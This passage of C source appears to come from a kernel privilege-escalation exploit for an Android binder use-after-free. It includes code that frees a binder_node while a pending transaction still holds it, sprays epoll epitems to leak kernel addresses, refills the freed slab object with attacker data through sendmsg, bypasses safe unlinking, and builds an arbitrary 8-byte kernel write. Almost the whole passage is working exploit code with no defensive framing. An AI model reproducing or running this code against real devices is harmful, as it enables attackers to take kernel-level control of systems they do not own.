	/* Prepare the pending nodes array. */
	uaf_node_th = calloc(num_pending + 1, sizeof(pthread_t));
   if (!uaf_node_th) {
      log_err("[-] Unable to allocate new pending node thread array. Reason: '%s'\n", strerror(errno));
      goto err;
   }

	vma_start = setup_pending_nodes(bs, handle, uaf_node_th, num_pending, 0);
   if (!vma_start) {
      log_err("[-] Bug trigger failed.\n");
      goto err;
   }

   /* Initialize exp_node. */
   node->bs = bs;
   node->vma_start = vma_start;
   memset(node->name, 0, sizeof(node->name));
   strncpy(node->name, name, sizeof(node->name) - 1);
   node->handle = handle;
   node->th = uaf_node_th;
   node->idx = 0;
   node->num_pending = num_pending;
   node->max = num_pending;
   node->second = false;
   node->target_fd = -1;
   node->ep_fd = -1;

   return node;

err:
   if (uaf_node_th)
      free(uaf_node_th);

   return NULL;
}

/*
 * Create a new `exp_node`.
 */
struct exp_node *node_new(const char *name)
{
   struct exp_node *node = NULL;

   node = calloc(1, sizeof(*node));
   if (!node) {
      log_err("[-] Unable to allocate new node. Reason: '%s'\n", strerror(errno));
      return NULL;
   }

   /* Need to bootstrap the associated endpoint. */
   bootstrap_endpoint(name);

   if (!_node_new(node, name)) {
      free(node);
      return NULL;
   }

   return node;
}

/*
 * Free all pending node threads.
 */
void node_free_pending_nodes(struct exp_node *node)
{
   int i;

	/* Terminate all pending nodes. */
	for (i = 0; i < node->num_pending; i++) {
		pending_node_terminate(node->bs, node->handle, node->th[i]);
	}

}

/*
 * Free an exp_node, and the associated binder endpoint and pending
 * transactions as well. The only way to safely remove a dangling
 * `binder_node` from the `binder_proc` is to close the associated
 * file descriptor.
 */
static void _node_free(struct exp_node *node, bool reset)
{

	int i;
	int n = node->num_pending;

	/* Terminate all pending nodes. */
	for (i = 0; i < n; i++) {
		pending_node_terminate(node->bs, node->handle, node->th[i]);
	}

	/* Close binder. */
	binder_close(node->bs);
   
   /* Close the remaining epitem if exists. */
   if (node[0].ep_fd != -1)
      close(node[0].ep_fd);

	/* Reset the associated endpoint. */
   if (reset) {
      //endpoint_reset(node->name);
      terminate_endpoint(node->name);
      bootstrap_endpoint(node->name);
   } else {
      terminate_endpoint(node->name);
      /* Free the memory associated with the node. */
      free(node->th);
      free(node);
   }
}

/*
 * Free an `exp_node` and terminate the associated
 * endpoint.
 */
void node_free(struct exp_node *node)
{
   _node_free(node, false);
}

/*
 * Reset an `exp_node` by restarting the remote endpoint.
 */
bool node_reset(struct exp_node *node)
{
   uint8_t name[16];

   memset(name, 0, sizeof(name));
   strncpy(name, node->name, sizeof(name)-1);
   _node_free(node, true);

   /* Reinit node. */
   if (_node_new(node, name))
      return true;

   return false;
}

/*
 * Use the vulnerable to decrement the refcount of the underlying `binder_node` and have it eventually
 * be `kfree()`ed.
 */
void node_kfree(struct exp_node *node)
{
   if (!node)
      return;

   pending_node_free(node->bs, node->handle, node->vma_start, node->num_pending + 1, 1, node->second);
}



#define NEPITEMS  0x20

/*
 * This function is used to disclose a `file` structure from a given file descriptor.
 * It relies on the fact that we can leak data at offset 0x58 and 0x60 a `binder_node`, which
 * exactly overlap with linked list pointer of epitem structure pointing to the 'file' we
 * gave in parameter to `EPOLLCTL_ADD`
 */
static bool _disclose_file_addr(struct exp_node *node, int *ep_arr, int n)
{
   uint64_t file_addr = 0;
   uint64_t origA, origB, A, B;
   int idx = -1;
   int i;

   if (!node || !ep_arr)
      return 0;

   /* leak the original value. */
   node_leak(node, &origA, &origB);

   if (origA == 0 || origB == 0 || origB == 0xdead000000000200)
      return 0;

   /* Close the epitems by starting by the end of the array. */
   i = n - 1;
   bool found = false;
   while (i >= 0) {
      /* Close 1 epitem. */
      close(ep_arr[i]);
      ep_arr[i] = -1;

      /* Leak the result to see if something changed. */
      node_leak(node, &A, &B);
      if (!found && (A != origA || B != origB)) {
         if (B == 0xdead000000000200) {
            return false;
         }
         idx = i - 1;
         i--;
         found = true;
      }
      i--;
   }

   /* Leak our values, we should have something interesting. */
   node_leak(node, &A, &B);

   node->file_addr = A - 0xd8;
   node->ep_fd = ep_arr[idx];

   return true;
}

/*
 * Free a `binder_node` and reallocates an `epitem` structure
 * in its place.
 */
bool node_realloc_epitem(struct exp_node *node, int fd)
{
   bool res = false;
   struct epoll_event evt;
   uint64_t file_addr = 0;
   int ep_arr[NEPITEMS + 1];
   int i, j, k, n;

   if (!node)
      return false;

   /* Prepare epoll structure. */
   bzero(&evt, sizeof(evt));
   evt.events = EPOLLIN;

  for (i = 0; i < NEPITEMS; i++)
      ep_arr[i] = -1;

  evt.data.fd = fd;
  epoll_ctl(ep_arr[0], EPOLL_CTL_ADD, fd, &evt);

   /* Allocate the epitems. */
  for (i = 0; i < NEPITEMS; i++) {
     int ep = epoll_create1(0);
      if (ep < 0) {
         log_err("epoll_create1: '%s'\n", strerror(errno));
         goto cleanup;
      }

      ep_arr[i] = ep;
  }

   /* Free the `binder_node`. */
   node_kfree(node);

   /* Try to reallocate with `struct epitem`. */
   for (i = 1; i < NEPITEMS; i++) {
      evt.data.fd = fd;
      epoll_ctl(ep_arr[i], EPOLL_CTL_ADD, fd, &evt);
   }

   if (!_disclose_file_addr(node, ep_arr, NEPITEMS))
      goto cleanup;

   node->target_fd = fd;

   return true;

cleanup:
      for (i = 0; i < NEPITEMS; i++) {
         if (ep_arr[i] != -1)
            close(ep_arr[i]);
      }

   return res;
}


/*
 * Disclose the kernel address of a `binder_node` by relying on 2 `binder_node`
 * whose content has been replaced by `epitem` structure.
 * We close the sprayed `epitem` structure, until we are sure about which epitem has
 * replace the content of our `binder_node`. By controlling 2 epitem which points back to each
 * other, we can disclose the content of both `binder_node` by reading the `prev` and `next` field
 * of the `epitem` structure, which in this case point to each other.
 */
bool node_kaddr_disclose(struct exp_node *node1, struct exp_node *node2)
{

   uint64_t a0;
   uint64_t b0;
   uint64_t b1;
   uint64_t a1;

   if (!node1->file_addr || node1->target_fd == -1 || node2->target_fd != -1)
      return false;

   /* The node needs to be single. */
   node_leak(node1, &a0, &b0);
   if (a0 != b0)
      return false;

   while (!node_realloc_epitem(node2, node1->target_fd))
      node_reset(node2);

   /* Looks good, let's disclose the respective kaddrs. */
   node_leak(node1, &a0, &b0);
   node_leak(node2, &a1, &b1);

   if (a0 == b1) {
      node1->kaddr = a1 - 0x58;
      node2->kaddr = b0 - 0x58;
   } else if (b0 == a1) {
      node2->kaddr = a0 - 0x58;
      node1->kaddr = b1 - 0x58;
   } else {
      return false;
   }

   return true;
}


/*
 * Free an epitem structure, by closing the file descriptor.
 * The only trouble here is the fact that it's freed using
 * `call_rcu()` which introduced indetermism when trying to replace
 * the freed content.
 */
bool node_free_epitem(struct exp_node *node)
{
   if (!node || node->ep_fd == -1)
      return false;

   close(node->ep_fd);
   node->ep_fd = -1;
   /* Allow the CPU to enter quiescent state and free the `epitem`. */
   usleep(10000); 

   return true;
}


/*
 * This function is a little bit complicated (slow?), as it needs to replace a
 * `binder_node` with an epitem first, to disclose its kernel address, and then replace it
 * with controlled content using the `sendmsg()` threads to do so. The only trouble being
 * that the `epitem` structure is freed using `call_rcu()` which introduces indetermism. Therefore
 * it gets tricky to reliably reallocate the content of the `binder_node`.
 */
bool node_realloc_content(struct exp_node *node, void *data, size_t size)
{
   bool res = false;
   uint64_t origA, A, B;

   if (!node)
      return false;


   setup_realloc_buffer(data, size);

   origA = *(uint64_t *)(data + 0x58);


   /* Decide which course of action to take. */

   
   /* Do we have an overlay with an epitem? */
   if (node->ep_fd != -1) {
      // Easy, just free the epitem. 
      close(node->ep_fd);
      usleep(10000);
      node->ep_fd = -1;
   } else if (node->tid) {
      //DO we really want to do that?
      log_info("node->tid!!!!\n");
      reset_realloc_threads();
      return false;
   } else {
      /* It hasn't been freed, so just kfree it. */
      node_kfree(node);
   }

   /* Let the threads spray kmalloc() with controlled content. */
   realloc_barrier_wait();
   /* Wait a little bit.*/

   /* Leak new node value and hope for the best. */
   node_leak(node, &A, &B);

   /* Double check to see if the node content was realloc properly. */
   if (A == origA) {
      res = true;

      if (discard_realloc_thread(B))
         node->tid = B;
   }

   reset_realloc_threads();

   return res;
}


/*
 * Trigger a write8 and overwrite and arbitrary location with a controlled value.
 * As above, we need to go through the cycle of replacing a `binder_node` with an epitem
 * and then with controlled content from the `sendmsg()`  threads.
 */
bool node_write8(struct exp_node *node, uint64_t what, uint64_t where)
{
   struct exp_node *dummy = NULL;
   int pfd[2];
   uint8_t data[0x80];

   if (!node)
      return false;

   if (node->idx == node->num_pending)
      return false;

   memset(data, 0, 0x80);

   *(uint64_t *)(data + 0x20) = what;
   *(uint64_t *)(data + 0x28) = where;
   *(uint64_t *)(data + 0x30) = 0; 
   *(uint64_t *)(data + 0x38) = 0; /* proc == NULL */
   *(uint64_t *)(data + 0x40) = 0; /* No refs. */
   *(uint32_t *)(data + 0x48) = 0; /* Internal strong refs. */
   *(uint32_t *)(data + 0x4c) = 0; /* local_weak_refs  == 0.  */
   *(uint32_t *)(data + 0x50) = 1; /* local strong refs. */
   *(uint32_t *)(data + 0x54) = 0; /* tmp_refs == 0. */
   *(uint64_t *)(data + 0x58) = 0x4444444444444444; /* Used by node_realloc_content to verify replacement */
   *(uint64_t *)(data + 0x68) = 0; /* has_strong_refs == 0 &&  has_weak_refs == 0 */

   /* Create dummy node. */
   dummy = node_new("dummy");
   pipe(pfd);

   /* Overlay an epitem. */
   while (!node_realloc_epitem(dummy, pfd[0]))
         node_reset(dummy);


   /* Do we know the node kaddr yet? */
   if (!node->kaddr) {
      /* Drop the current epitem. */
      node_free_epitem(node);


      /* Use the previous'dummy' node to disclose both
       * dummy and node kaddr.
       */
      node_kaddr_disclose(dummy, node);
   }

   /* update the kaddr values to bypass safe unlinking. */
   *(uint64_t *)(data + 0x8) = node->kaddr + 0x8;
   *(uint64_t *)(data + 0x10) = node->kaddr + 0x8;

   log_info("[*] Reallocating content of '%s' with controlled data.", node->name);
   while (!node_realloc_content(node, data, 0x80)) {
      log_info(".");
      node_reset(node);
      while (!node_kaddr_disclose(dummy, node)) {
         node_reset(node);
      }

      /* Update values. */
      *(uint64_t *)(data + 0x8) = node->kaddr + 0x8;
      *(uint64_t *)(data + 0x10) = node->kaddr + 0x8;
   }

   if (dummy) {
      node_free(dummy);
      close(pfd[0]);
      close(pfd[1]);
   }
   log_info("[DONE]\n");

   /* Perform the actual write8, all the code before was for setup... */
   log_info("[+] Overwriting 0x%llx with 0x%llx...", where, what);
   pending_node_write8(node->th[node->idx - 1]);
   log_info("[DONE]\n");

   return true;
}


/*
 * Trigger a write8 primitive and overwrite an arbitrary location with a NULL value.
 * Assumes the binder node associated with `node` has just been freed, and its kernel
 * address has been previously disclosed.
 */
bool node_write_null(struct exp_node *node, uint64_t where)
{
   return node_write8(node, 0, where);
}


bool node_leak(struct exp_node *node, uint64_t *A, uint64_t *B)
{
   if (!node || node->idx == node->num_pending)
      return false;

   pending_node_leak(node->th[node->idx++], A, B);

   return true;
}


```

`src/pending_node.c`:

```c
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#include <errno.h>
#include <poll.h>
#include <sys/syscall.h>

#include "log.h"
#include "binder.h"
#include "endpoint.h"
#include "pending_node.h"

static struct pending_node *pending_nodes = NULL;
static uint64_t last_node_th = 0;

static struct pending_node *pending_node_new(void)
{
	struct pending_node *node = NULL;

	node = malloc(sizeof(*node));
	if (!node) {
		log_err("malloc: %s\n", strerror(errno));
		return NULL;
	}

	memset(node, 0, sizeof(*node));

	if (pthread_barrier_init(&node->barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->ready, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->do_barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->done_barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}


	/* Insert in front. */
	node->next = pending_nodes;
	pending_nodes = node;

	return node;
}

static struct pending_node *pending_node_get(pthread_t node_th)
{
	struct pending_node *tmp = pending_nodes;

	while (tmp) {
		if (tmp->uaf_node_th == node_th)
			return tmp;
		tmp = tmp->next;
	}

	return NULL;
}

/*
 * This thread keep a reference to the freed binder_node, which allows leaking a qword at offset 0x58
 * and 0x60 of an object in the kmalloc-128 slab, as well a trigerring a controlled write8
 */
void *pending_node_thread(void *args)
{
	struct pending_node *node = (struct pending_node *)args;
	uint32_t remaining = 0, consumed = 0;
	uint32_t looper = BC_ENTER_LOOPER;
	struct binder_io msg, reply;
	struct binder_state *from = node->bs;
	uint64_t handle = node->uaf_node;
	uint8_t msg_data[0x1000], reply_data[0x1000];
	uint64_t res = -1;
	int signo;
	sigset_t set;
   uint64_t retval = 0;

	/* Enter looper. */
	binder_write(from, &looper, sizeof(looper));

	struct binder_transaction_data *t = (struct binder_transaction_data *)(msg_data + sizeof(uint32_t));
	make_transaction(msg_data, false, handle, reply_data, 0x10, NULL, 0);
	/* Fix transaction code. */
	t->code = ADD_PENDING_NODE;
	/* Make the call. */
	binder_write(from, msg_data, sizeof(*t) + sizeof(uint32_t));

	/* Poll for the answer. */
	/* Wait for BR_TRANSACTION_COMPLETE. */
	struct pollfd pfd;
	pfd.fd = from->fd;
	pfd.events = POLLIN;
	/* Wait up to a sec. */
	if (!poll(&pfd, 1, 1000)) {
		fprintf(stderr, "[-] Something went wrong will inserting the pending node.\n");
		pthread_exit(&res);
	}

	pthread_barrier_wait(&node->ready);
	
	pthread_barrier_wait(&node->ready);

   /* We wait here, until ask by the exploit to leak values from the transaction. */
   pthread_barrier_wait(&node->do_barrier); //Do leak

	/* Reading back transaction. */
	consumed = remaining = 0;
   uint32_t cmd;
	do {
      cmd = binder_read_next(from, reply_data, &remaining, &consumed);
   } while (cmd != BR_TRANSACTION && cmd != BR_REPLY); 

   /* Getting a BR_REPLY, would mean that we successfully cleaned up the transaction. */
   if (cmd == BR_REPLY)  {
      goto end;
   }
   
   t = (struct binder_transaction_data *)(reply_data + consumed - sizeof(*t));
	/* data at offset 0x58. */
	node->uaf_buffer = t->data.ptr.buffer;

	node->leaked_data[0] = t->target.ptr; /* data at offset 0x58. */
	node->leaked_data[1] = t->cookie;	/* data at offset 0x60. */

	/* Check the node state. */
	if (node->state == NODE_FINISHED)
		goto end;

   node->state = NODE_LEAKED;

   pthread_barrier_wait(&node->done_barrier);
   pthread_barrier_wait(&node->ready);

   /* This for sync. */

   pthread_barrier_wait(&node->do_barrier);

	/* Check the node state. */
	if (node->state == NODE_FINISHED)
		goto end;


	/* If we decide to go ahead with the buffer freeing, wait on the barrier,
	 * otherwise just exit the thread.
	 */
   binder_free_buffer(from, node->uaf_buffer);
   node->state = NODE_FREE;
end:
   pthread_barrier_wait(&node->done_barrier);
   ioctl(node->bs->fd, BINDER_THREAD_EXIT, 0);
	pthread_exit(&retval);
}



static void pending_node_create_thread(void *args)
{
	struct binder_state *bs = (struct binder_state *)*(uint64_t *)args;
	uint64_t node = *(uint64_t *)(args + 8);

	/* Create a ONE_WAY transaction to ask the endpoint to create a pending_node
	 * back to us.
	 */
	struct binder_transaction_data *t;
	uint8_t rdata[128];
	uint8_t txn_data[128];

	uint32_t remaining = 0, consumed = 0;
	struct binder_io msg, reply;

	/* Register this thread as a looper. */
	uint32_t looper = BC_ENTER_LOOPER;
	binder_write(bs, &looper, sizeof(looper));


	/* Send the ONE_WAY transaction. */
	t = (struct binder_transaction_data *)(txn_data + sizeof(uint32_t));
	make_transaction(txn_data, true, node, rdata, 0x8, NULL, 0);
	/* Fix transaction code. */
	t->code = ADD_PENDING_NODE;
	// printf("[*] About to make node\n");
	// getchar();
	/* Make the binder call. */
	binder_write(bs, txn_data, sizeof(*t) + sizeof(uint32_t));

	/* Wait for the transaction from the endpoint. */
	while (binder_read_next(bs, rdata, &remaining, &consumed) != BR_TRANSACTION);


	// printf("[*] Node should be made\n");
	// getchar();

	/* Get transaction. */
	t = (struct binder_transaction_data *)(rdata + consumed - sizeof(*t));

	if (t->code != ADD_PENDING_NODE) {
		fprintf(stderr, "[-] Invalid transaction code %x. Expected %x\n", t->code, ADD_PENDING_NODE);
		exit(1);
	}

	/* Free the buffer. */
	binder_free_buffer(bs, t->data.ptr.buffer);

	/* Okay, so instead of a reply, we send a new transaction here, in order to have the thing go into the pending node list. */
	t = (struct binder_transaction_data *)(txn_data + sizeof(uint32_t));
	make_transaction(txn_data, false, node, rdata, 0x10, NULL, 0);
	/* Fix transaction code. */
	t->code = ADD_PENDING_NODE;
	/* Make the call. */
	binder_write(bs, txn_data, sizeof(*t) + sizeof(uint32_t));

	int res = 0;
	pthread_exit(&res);
}

/*
 * The endpoint calls into this function to setup a pending node.
 */
pthread_t add_pending_node(struct binder_state *from, uint64_t pending_node)
{
	pthread_t th;

	struct pending_node *node = NULL;

	/* Create new pending_node */
	node = pending_node_new();
	if (!node)
		return NULL;

	node->bs = from;
	node->uaf_node = pending_node;

	if (pthread_create(&th, NULL, pending_node_thread, (void *)node)) {
		perror("pthread");
		return (pthread_t)-1;
	}

	node->uaf_node_th = th;
	last_node_th = th;

	pthread_barrier_wait(&node->ready);
	
   return th;
}


/*
 * The endpoint calls into this function to
 * remove a specific pending node.
 */
void terminate_pending_node(pthread_t th)
{
	/* Just unlock the barrier, and pthread_join */
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return ;


   pthread_barrier_wait(&node->ready);
   node->state = NODE_FINISHED;
   node->uaf_buffer = 0;
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
	pthread_join(node->uaf_node_th, NULL);

	/* Remove node. */
	
	struct pending_node *tmp = pending_nodes;
	if (tmp == node) {
		pending_nodes = node->next;

	} else {
		while (tmp->next != node)
			tmp = tmp->next;

		tmp->next = node->next;
	}
	free(node);
}


/*
 * Perform a ADD_PENDING_NODE binder query, in order to ask the remote
 * endpoint to create a pending node transaction.
 */
pthread_t pending_node_create(struct binder_state *bs, uint64_t node)
{
	uint64_t args[] = {bs, node};
	pthread_t th;

	if (pthread_create(&th, NULL, pending_node_create_thread, (void *)args)) {
		perror("pthread create\n");
		exit(0);
	}

	pthread_join(th, NULL);

	return last_node_th;
}

void pending_node_free(struct binder_state *bs, uint64_t node, uint64_t vma_start, uint32_t strong, uint32_t weak, bool second)
{
	/* So we have our pending node in another thread. Now release our reference to uaf_node
	 * and trigger the bug (3 times needs) to free the uaf_node, while the pending node thread keeps
	 * a reference to it (as target_node)
	 */
	int i;
	for (i = 0; i < strong; i++)
		dec_node(bs, node, vma_start, true, second);

	for (i = 0; i < weak; i++)
		dec_node(bs, node, vma_start, false, second);
}

/*
 * Trigger a write8, by having the pending node thread
 * calling BC_FREE_BUFFER, which will enter the
 * `binder_dec_node()` function with (hopefully) controlled
 * `binder_node`, ultimately leading to a controlled
 * write8
 */
void pending_node_write8(pthread_t th)
{
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return ;
	/* Buffer release. */

   pthread_barrier_wait(&node->ready);
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
   pthread_join(th, NULL);
	
   struct pending_node *tmp = pending_nodes;
	if (tmp == node) {
		pending_nodes = node->next;

	} else {
		while (tmp->next != node)
			tmp = tmp->next;

		tmp->next = node->next;
	}

	free(node);
}

/*
 * Kindly ask the endpoint to terminate a specific pending node thread.
 */
void pending_node_terminate(struct binder_state *bs, uint64_t handle, pthread_t th)
{
	uint8_t txn_data[0x100];
	uint8_t reply_data[0x100];
	struct binder_io msg, reply;


	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, reply_data, sizeof(reply_data), 10);

	bio_put_uint32(&msg, (uint32_t)th);
	bio_put_uint32(&msg, (uint32_t)((uint64_t)(th)>>32));
	binder_call(bs, &msg, &reply, handle, TERMINATE_PENDING_NODE);

	binder_free_buffer(bs, reply.data0);
}

/*
 * Leak the 2 qword of data from the UAFed pending node.
 * It has the side effect or terminating the pending_node_thread
 */
void pending_node_leak(pthread_t th, uint64_t *q1, uint64_t *q2)
{
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return;
	/* Okay spray epoll structures. */
   pthread_barrier_wait(&node->ready);
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
	/* Inspecting node value. */

	if (q1)
		*q1 = node->leaked_data[0];
	if (q2)
		*q2 = node->leaked_data[1];
}

```

`src/realloc.c`:

```c
#define _GNU_SOURCE
#include <sched.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>

#include "realloc.h"
#include "log.h"
#include "helpers.h"

struct realloc_thread {
   void *stack;
   pid_t pid;
   pthread_t th;
   bool evicted;
   size_t size;
   int cpu;
   int pair[2];
   int ctrl[2];
   pthread_barrier_t barrier;
};

uint8_t realloc_buffer[BUFSZ];

volatile struct realloc_thread threads[NREALLOC];


pthread_barrier_t realloc_barrier;

/*
 * This thread is in charge of reallocating the freed binder_node
 * with controlled data.
 */
void *realloc_thread(void *args)
{

   uint8_t buffer[BUFSZ + 1];
   struct realloc_thread *thread = (struct realloc_thread *)args;
   size_t size = thread->size;
   int cpu = thread->cpu;
	struct msghdr msg;
	struct iovec iov;
	memset(&iov, 0, sizeof(iov));
	memset(&msg, 0, sizeof(msg));

	pin_cpu(cpu);

	uint32_t pid = syscall(__NR_gettid);
	/* Exhaust the available socket window. */
	iov.iov_base = realloc_buffer;
	iov.iov_len = size;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	while (sendmsg(thread->pair[0], &msg, MSG_DONTWAIT) > 0);

	/* The next call will block. */
	msg.msg_control = realloc_buffer;
	msg.msg_controllen = size;

   /* Signal we have finished spawning. */

   thread->evicted = false;
   while (!thread->evicted) {

      //pthread_barrier_wait(&realloc_barrier);
      /* We're waiting here for the signal to copy the buffer data. */
      pthread_barrier_wait(&thread->barrier);


      memcpy(buffer, realloc_buffer, size);
      *(uint64_t *)(buffer + 0x60) =  pid;
      msg.msg_control = buffer;
      msg.msg_controllen = size;

      //pthread_barrier_wait(&realloc_barrier);
      /* We're waiting for the signal to block on the sendmsg syscall, and kmalloc() our
       * controlled data.
       */
      pthread_barrier_wait(&thread->barrier);
      syscall(__NR_sendmsg, thread->pair[0], &msg, 0);


      pthread_barrier_wait(&thread->barrier);

      /* And fill the socket queue once again. */
      while (sendmsg(thread->pair[0], &msg, MSG_DONTWAIT) > 0);
   }

   /* Wait for the exit signal. */

   pthread_barrier_wait(&thread->barrier);

   return NULL;
}

/*
 * Wait on the barrier, which will ultimately make the threads enter the
 * `sendmsg()` syscall and allocate controlled data.
 */
void realloc_barrier_wait(void)
{
   int i;

   for (i = 0; i < NREALLOC; i++) {
      if (threads[i].evicted)
         continue;
      pthread_barrier_wait(&threads[i].barrier);
   }
}

/*
 * Spawn all the threads used during the reallocation.
 */
void spawn_realloc_threads()
{
	memset(realloc_buffer, 'A', BUFSZ);
	*(uint32_t *)realloc_buffer = BUFSZ;
	*(uint32_t *)(realloc_buffer + 4) = 0; // set node->lock

	if (pthread_barrier_init(&realloc_barrier, NULL, NREALLOC + 1) < 0) {
		perror("pthread_barrier_init");
		exit(1);
	}

	int i;
	int ncpus = sysconf(_SC_NPROCESSORS_ONLN);
	for (i = 0; i < NREALLOC; i++) {
		pid_t pid;
      void *stack = malloc(0x10000);
      threads[i].evicted = false;
      threads[i].size = BUFSZ;
      threads[i].cpu = i % ncpus;
      threads[i].stack = stack;

      if (pthread_barrier_init(&threads[i].barrier, NULL, 2) < 0) {
         log_err("[-] pthread_barrier_init: '%s'\n", strerror(errno));
         exit(1);
      }

      /* Create a socketpair. */
      if (socketpair(AF_LOCAL, SOCK_DGRAM, 0, threads[i].pair) < 0) {
         perror("socketpair");
         pthread_exit(NULL);
      }

		pid = clone(realloc_thread, stack + 0x10000 - 8, CLONE_VM|CLONE_FILES|SIGCHLD, &threads[i]);
		if (pid < 0) {
			perror("clone");
			exit(1);
		}

      threads[i].pid = pid;

	}
}

/*
 * Setup the content of the buffer, whose content will be sprayed in kernel during the
 * `sendmsg()` call.
 */
void setup_realloc_buffer(void *content, size_t size)
{
   if (size <= 8)
      return;

   if (size > BUFSZ)
      size = BUFSZ;

   /* We need to skip the first 8 bytes, because otherwise, sendmsg will fail. */
   memcpy(realloc_buffer + 8, content + 8, size - 8);
	/* Unlock the realloc thread, let them copy the buffer. */
   realloc_barrier_wait();
}

/*
 * Discard a thread from the pool. We do this when we successfully replaced a `binder_node` with controlled
 * content, and this `binder_node` is subsequently used to trigger a write8, as the side effect of this is
 * to free (once again) the `binder_node`. As the realoc thread will keep a reference to the `binder_node` and
 * free it as well, we keep it blocking on `sendmsg()` for now, until we can clean that reference from the kernel
 * stack later on.
 */
bool discard_realloc_thread(pid_t pid)
{
   int i;

   for (i = 0; i < NREALLOC; i++) {
      if (threads[i].pid == pid) {
         threads[i].evicted = true;
         return true;
      }
   }

   return false;
}

/*
 * Make the threads exit their blocking `sendmsg()` call, and brace themselves before
 * being use once again to allocate controlled data in kernel land.
 */
void reset_realloc_threads()
{
   int i;
   uint8_t buf[0x1000];

   for (i = 0; i < NREALLOC; i++) {
      if (threads[i].evicted)
         continue;
      while (recv(threads[i].pair[1], buf, 0x1000, MSG_DONTWAIT) > 0);
      pthread_barrier_wait(&threads[i].barrier);
   }
}

/*
 * We're done, kill the whole thread pool.
 */
void cleanup_realloc_threads()
{
	int i;
	/* Kill realloc threads. */
	for (i = 0; i < NREALLOC; i++) {
		int status;
      if (threads[i].evicted){
			continue;
      }
      kill(threads[i].pid, SIGKILL);
      close(threads[i].pair[0]);
      close(threads[i].pair[1]);

      //pthread_barrier_wait(&threads[i].barrier);  
	}
	int status;
	for (i = 0; i < NREALLOC; i++) {
      if (threads[i].evicted)
			continue;
		waitpid(threads[i].pid, &status, 0);
      //pthread_join(threads[i].th, NULL);
      threads[i].pid = 0;
      free(threads[i].stack);
      threads[i].stack = 0;
	}
}




```